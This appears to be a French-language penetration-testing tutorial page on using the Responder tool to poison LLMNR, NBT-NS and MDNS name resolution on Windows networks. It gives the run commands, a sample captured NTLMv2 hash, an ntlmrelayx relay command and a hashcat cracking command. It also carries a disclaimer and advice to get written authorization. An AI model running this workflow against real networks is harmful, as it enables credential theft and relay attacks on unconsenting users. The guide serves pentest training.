# Responder

### **Responder - Guide Complet pour Capturer les Identifiants sur un Réseau Windows**

***

⚠️ **Avertissement** : Ce contenu est strictement destiné à un usage éducatif et éthique dans le domaine de la cybersécurité. Toute utilisation illégale ou malveillante est interdite et engage la seule responsabilité de l’utilisateur.

***

### **Introduction**

**Responder** est un outil de capture d’identifiants sur des réseaux Windows. Il exploite les failles des protocoles **LLMNR (Link-Local Multicast Name Resolution)**, **NBT-NS (NetBIOS Name Service)**, et **MDNS (Multicast DNS)** pour répondre aux requêtes de résolution de noms de domaine des machines clientes. Responder peut capturer des hash NTLMv1/v2 ou, dans certains cas, des mots de passe en clair. Cet outil est souvent utilisé dans les pentests pour évaluer la sécurité des réseaux internes.

***

### **🚀 Étape 1 : Installation de Responder**

**1.1 Pré-requis**

* Un système Linux (Kali Linux, Parrot OS, ou une distribution similaire).
* Les permissions root pour exécuter Responder.

**1.2 Installation**

1.  Si Responder n'est pas installé par défaut, téléchargez-le depuis son dépôt GitHub :

    ```bash
    git clone https://github.com/lgandx/Responder.git
    cd Responder
    ```
2.  Vérifiez l’installation en lançant :

    ```bash
    python3 Responder.py -h
    ```

***

### **🛠️ Étape 2 : Utilisation de Base**

**2.1 Identifier l’Interface Réseau**

Listez vos interfaces réseau avec la commande suivante :

```bash
ifconfig
```

Notez le nom de l’interface connectée au réseau cible (ex. : `eth0` ou `wlan0`).

***

**2.2 Lancer Responder**

Pour capturer des hash NTLM et répondre aux requêtes réseau :

```bash
python3 Responder.py -I <interface>
```

**Exemple** :

```bash
python3 Responder.py -I eth0
```

**Explications :**

* `-I <interface>` : Spécifie l'interface réseau à surveiller.

***

**2.3 Résultat Attendu**

Lorsque des machines envoient des requêtes de résolution, Responder intercepte les hash NTLM :

```ruby
[+] NTLMv2-SSP Hash Captured
192.168.1.5 - Administrator::WORKGROUP:aa1b2c3d4e5f6...
```

***

### **🔍 Étape 3 : Fonctionnalités Avancées**

**3.1 Modifier les Modules Actifs**

Responder utilise plusieurs modules (SMB, HTTP, FTP, etc.) pour répondre aux requêtes. Vous pouvez les activer ou les désactiver dans le fichier `Responder.conf`.

1.  Ouvrez le fichier de configuration :

    ```bash
    nano Responder.conf
    ```
2.  Modifiez les lignes pour activer ou désactiver des services :

    ```
    SMB = On
    HTTP = Off
    FTP = Off
    ```

**3.2 Combiner avec NTLMRelayX**

Pour exploiter les hash capturés, combinez Responder avec **NTLMRelayX** :

1. Configurez Responder pour capturer les hash.
2.  Lancez NTLMRelayX pour les relayer :

    ```bash
    python3 ntlmrelayx.py -tf targets.txt -smb2support
    ```
3. Listez les cibles à relayer dans `targets.txt`.

***

### **📖 Bonnes Pratiques**

1. **Obtenir des Autorisations**
   * Avant d’exécuter Responder, assurez-vous d’avoir une autorisation écrite pour éviter des implications légales.
2. **Limiter l’Impact**
   * Utilisez Responder uniquement dans des segments de réseau spécifiques.
   * Désactivez les modules inutiles pour réduire l’empreinte.
3. **Analyser les Résultats**
   *   Passez en revue les hash capturés et utilisez des outils comme **hashcat** ou **John the Ripper** pour tenter de les décrypter :

       ```bash
       hashcat -m 5600 hash.txt wordlist.txt
       ```

***

**Liens utiles :**

* [Mentions légales](https://dika-1.gitbook.io/road-to-hacker/mentions-legales)
* [Politique de confidentialité](https://dika-1.gitbook.io/road-to-hacker/politique-de-confidentialite)
* [Contactez-nous](mailto:dika-road-to-hacker@protonmail.com)
